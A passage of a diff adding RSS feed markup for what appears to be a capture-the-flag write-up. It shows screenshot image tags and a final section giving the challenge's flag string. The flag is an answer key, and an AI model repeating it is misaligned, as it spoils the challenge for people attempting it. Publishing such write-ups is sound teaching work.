+height="981"
+srcset="https://qiaonpc.github.io/post/sustainable-development-goals/3.%20decrypted_hu7ebd0bc6845c1a01fec8af9e02782426_105156_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/sustainable-development-goals/3.%20decrypted_hu7ebd0bc6845c1a01fec8af9e02782426_105156_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Decrypted"
+class="gallery-image"
+data-flex-grow="141"
+data-flex-basis="338px"
+>&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/sustainable-development-goals/4.%20flag.png"
+width="1245"
+height="688"
+srcset="https://qiaonpc.github.io/post/sustainable-development-goals/4.%20flag_hu70cd8129bcd94dc83babdbaf413fbf83_81768_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/sustainable-development-goals/4.%20flag_hu70cd8129bcd94dc83babdbaf413fbf83_81768_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="180"
+data-flex-basis="434px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="flag">Flag
+&lt;/h2>&lt;p>The flag for this challenge is:&lt;br>
+&lt;code>sunctf25{sh3lly_1n_my_b3lly}&lt;/code>&lt;/p></description></item></channel></rss>
